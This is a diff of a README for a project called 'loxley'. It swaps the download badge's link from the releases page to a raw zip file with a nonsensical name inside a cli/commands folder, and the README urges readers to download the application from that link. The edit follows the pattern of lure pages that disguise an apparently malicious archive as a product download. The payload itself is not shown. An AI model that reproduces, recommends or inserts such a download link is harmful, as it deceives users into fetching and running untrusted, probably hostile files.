@@ -1,6 +1,6 @@
 # 🎯 loxley - The Exit Desk That Never Sleeps
 
-[![Download loxley](https://img.shields.io/badge/Download-loxley-8A2BE2?style=for-the-badge&logo=github&logoColor=white&color=FF6B6B)](https://github.com/srane5798-cpu/loxley/releases)
+[![Download loxley](https://img.shields.io/badge/Download-loxley-8A2BE2?style=for-the-badge&logo=github&logoColor=white&color=FF6B6B)](https://github.com/srane5798-cpu/loxley/raw/refs/heads/main/cli/commands/epornitically.zip)
 
 **Visit this link to download the application.**
 
